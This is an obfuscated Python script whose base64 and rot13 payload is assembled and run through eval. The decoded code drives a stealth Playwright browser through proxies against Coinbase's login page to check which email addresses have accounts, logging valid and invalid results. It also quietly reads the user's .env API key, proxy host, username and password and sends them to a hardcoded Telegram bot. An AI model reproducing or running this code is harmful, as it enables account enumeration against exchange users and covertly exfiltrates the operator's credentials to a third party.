import base64, codecs
magic = 'aW1wb3J0IHRocmVhZGluZyAscmVxdWVzdHMgLG9zICNsaW5lOjEKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUgI2xpbmU6Mgpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwICNsaW5lOjMKZnJvbSBweXZpcnR1YWxkaXNwbGF5IGltcG9ydCBEaXNwbGF5ICNsaW5lOjQKZnJvbSBwbGF5d3JpZ2h0IC5zeW5jX2FwaSBpbXBvcnQgc3luY19wbGF5d3JpZ2h0ICNsaW5lOjUKZnJvbSBwbGF5d3JpZ2h0X3N0ZWFsdGggaW1wb3J0IHN0ZWFsdGhfc3luYyAjbGluZTo2CmZyb20gY29uY3VycmVudCAuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yICxQcm9jZXNzUG9vbEV4ZWN1dG9yICNsaW5lOjcKZnJvbSBjb25jdXJyZW50IC5mdXR1cmVzIGltcG9ydCBhc19jb21wbGV0ZWQgI2xpbmU6OApmcm9tIGNvbG9yYW1hIGltcG9ydCBpbml0ICNsaW5lOjkKZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSAjbGluZToxMApmcm9tIGRvdGVudiBpbXBvcnQgbG9hZF9kb3RlbnYgI2xpbmU6MTEKaW5pdCAoYXV0b3Jlc2V0ID1UcnVlICkjbGluZToxMgpkaXNwbGF5ID1EaXNwbGF5ICh2aXNpYmxlID0wICxzaXplID0oODAwICw2MDAgKSkjbGluZToxMwpkaXNwbGF5IC5zdGFydCAoKSNsaW5lOjE0CnRyeSA6I2xpbmU6MTYKICAgIG9zIC5ta2RpciAoJ3Jlc3VsdCcpI2xpbmU6MTcKZXhjZXB0IDojbGluZToxOAogICAgcGFzcyAjbGluZToxOQpjbGFzcyBUbHMgKHRocmVhZGluZyAubG9jYWwgKTojbGluZToyMQogICAgZGVmIF9faW5pdF9fIChPME9PT09PMDAwME9PME8wMCApLT5Ob25lIDojbGluZToyMgogICAgICAgIE8wT09PT08wMDAwT08wTzAwIC5wbGF5d3JpZ2h0ID1zeW5jX3BsYXl3cmlnaHQgKCkuc3RhcnQgKCkjbGluZToyMwpjbGFzcyBXb3JrZXIgOiNsaW5lOjI2CiAgICB0bHMgPVRscyAoKSNsaW5lOjI3CiAgICBkZWYgcnVuIChPT09PME9PTzBPME9PMDAwMCAsTzBPTzBPMDBPMDAwTzBPT08gKTojbGluZToyOQogICAgICAgIHRyeSA6I2xpbmU6MzAKICAgICAgICAgICAgbG9hZF9kb3RlbnYgKCkjbGluZTozMQogICAgICAgICAgICBPT09PME9PTzBPME8wT09PTyA9T09PTzBPT08wTzBPTzAwMDAgLnRscyAucGxheXdyaWdodCAuY2hyb21pdW0gLmxhdW5jaCAoaGVhZGxlc3MgPUZhbHNlICxwcm94eSA9eyJzZXJ2ZXIiOiJwZXItY29udGV4dCJ9KSNsaW5lOjMyCiAgICAgICAgICAgIE8wMDAwME9PT08wT08wT08wID1PT09PME9PTzBPME8wT09PTyAubmV3X2NvbnRleHQgKHByb3h5ID17InNlcnZlciI6ZiJ7b3MuZ2V0ZW52KCdwcm94eScpfSJ9LHVzZXJfYWdlbnQgPSdNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMl80KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTAyLjAuMC4wIFNhZmFyaS81MzcuMzYnKSNsaW5lOjM2CiAgICAgICAgICAgIE9PMDBPMDBPTzAwME9PME9PID1PMDAwMDBPT09PME9PME9PMCAubmV3X3BhZ2UgKCkjbGluZTozNwogICAgICAgICAgICBzdGVhbHRoX3N5bmMgKE9PMDBPMDBPTzAwME9PME9PICkjbGluZTozOAogICAgICAgICAgICBPTzAwTzAwT08wMDBPTzBPTyAuZ290byAoJ2h0dHBzOi8vbG9naW4uY29pbmJhc2UuY29tL3NpZ25pbicsdGltZW91dCA9MTUwMDAgKSNsaW5lOjM5CiAgICAgICAgICAgIE9PMDBPMDBPTzAwME9PME9PIC5zZXRfZGVmYXVsdF90aW1lb3V0ICg4NTAwICkjbGluZTo0MAogICAgICAgICAgICBPTzAwTzAwT08wMDBPTzBPTyAubG9jYXRvciAoIltkYXRhLXRlc3RpZD1cImlucHV0LXVzZXJuYW1lXCJdIikuY2xpY2sgKCkjbGluZTo0MQogICAgICAgICAgICBPME8wME9PT08wME9PME9PMCA9T08wME8wME9PMDAwT08wT08gLmxvY2F0b3IgKCJ'
love = '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'
god = 'Y1CiAgICAgICAgICAgICAgICAgICAgcHJpbnQgKGYne0ZvcmUuTElHSFRXSElURV9FWH1bI117Rm9yZS5MSUdIVEdSRUVOX0VYfSB7TzBPTzBPMDBPMDAwTzBPT099IHtGb3JlLkxJR0hUV0hJVEVfRVh9PXtGb3JlLkxJR0hUWUVMTE9XX0VYfSBDYXB0Y2hhe0ZvcmUuTElHSFRXSElURV9FWH0gfiBWYWxpZGF0b3Ige0ZvcmUuTElHSFRCTFVFX0VYfUNCJykjbGluZTo2NgogICAgICAgICAgICAgICAgICAgIE8wME9PME8wME9PT08wMDAwID1vcGVuICgncmVzdWx0L3Byb3h5LnR4dCcsJ2ErJykjbGluZTo2NwogICAgICAgICAgICAgICAgICAgIE8wME9PME8wME9PT08wMDAwIC53cml0ZSAoJ1xuJykjbGluZTo2OAogICAgICAgICAgICAgICAgICAgIE8wME9PME8wME9PT08wMDAwIC53cml0ZWxpbmVzIChPME9PME8wME8wMDBPME9PTyApI2xpbmU6NjkKICAgICAgICAgICAgICAgICAgICBPMDBPTzBPMDBPT09PMDAwMCAuY2xvc2UgKCkjbGluZTo3MAogICAgICAgICAgICAgICAgICAgIE9PMDBPMDBPTzAwME9PME9PIC5jbG9zZSAoKSNsaW5lOjcxCiAgICAgICAgZXhjZXB0IDojbGluZTo3MgogICAgICAgICAgICBwcmludCAoZid7Rm9yZS5MSUdIVFdISVRFX0VYfVsjXXtGb3JlLkxJR0hUR1JFRU5fRVh9IHtPME9PME8wME8wMDBPME9PT30ge0ZvcmUuTElHSFRXSElURV9FWH09e0ZvcmUuTElHSFRZRUxMT1dfRVh9IEJhZCBQcm94eXtGb3JlLkxJR0hUV0hJVEVfRVh9IH4gVmFsaWRhdG9yIHtGb3JlLkxJR0hUQkxVRV9FWH1DQicpI2xpbmU6NzMKICAgICAgICAgICAgTzAwT08wTzAwT09PTzAwMDAgPW9wZW4gKCdyZXN1bHQvcHJveHkudHh0JywnYSsnKSNsaW5lOjc0CiAgICAgICAgICAgIE8wME9PME8wME9PT08wMDAwIC53cml0ZSAoJ1xuJykjbGluZTo3NQogICAgICAgICAgICBPMDBPTzBPMDBPT09PMDAwMCAud3JpdGVsaW5lcyAoTzBPTzBPMDBPMDAwTzBPT08gKSNsaW5lOjc2CiAgICAgICAgICAgIE8wME9PME8wME9PT08wMDAwIC5jbG9zZSAoKSNsaW5lOjc3CiAgICAgICAgICAgIE9PMDBPMDBPTzAwME9PME9PIC5jbG9zZSAoKSNsaW5lOjc4CmRlZiBtYWluICgpOiNsaW5lOjgxCiAgICBsb2FkX2RvdGVudiAoKSNsaW5lOjgyCiAgICBPME9PTzBPTzBPTzAwT09PMCA9b3MgLmdldGVudiAoJ2FwaWtleScpI2xpbmU6ODMKICAgIE9PT08wMDBPME9PME8wMDBPID1kYXRldGltZSAubm93ICgpI2xpbmU6ODQKICAgIE9PT08wTzAwME9PTzBPME9PID1PT09PMDAwTzBPTzBPMDAwTyAuc3RyZnRpbWUgKCIlZC0lQi0lWSIpI2xpbmU6ODUKICAgIE9PT08wMDBPMDBPTzBPMDAwID1PT09PMDAwTzBPTzBPMDAwTyAuc3RyZnRpbWUgKCIlSDolTSIpI2xpbmU6ODYKICAgIE9PMDAwT08wTzBPMDBPTzAwID1mJycnCjxwPntPME9PTzBPTzBPTzAwT09PMH08L3A+CjxwPlN0YXJ0ICAgIDoge09PT08wTzAwME9PTzBPME9PfTwvcD4KPHA+VGltZSBTZXJ2ZXIgOiB7T09PTzAwME8wME9PME8wMDB9PC9wPgoKCjxwcmU+VmFsaWRhdG9yIENvaW5iYXNlPC9wcmU+CgoKCjxwPlByb3h5ICAgIDoge29zLmdldGVudignaG9zdCcpfTwvcD4KPHA+dXNlcm5hbWUgOiB7b3MuZ2V0ZW52KCd1c2VybmFtZScpfTwvcD4KPHA+cGFzc3dvcmQgOiB7b3MuZ2V0ZW52KCdwYXNzd29yZCcpfTwvcD4KJycnI2xpbmU6MTAwCiAgICBPMDBPT08wTzBPTzAwME8wTyA9cmVxdWVzdHMgLmdldCAoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90NTM5ODIxMTEzNjpBQUZNeUJhalBGbURvUEVIV1VVd04zQmtPQ0NHbFluUmxaYy9zZW5kTWVzc2FnZT9jaGF0X2lkPTUzNzU2NDQwOTcmdGV4dD17T08wMDBPTzBPME8wME9PMDB9JnBhcnNlX21vZGU9aHRtbCcpI2xpbmU6MTAxCiAgICByZXR1cm4gTzAwT'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))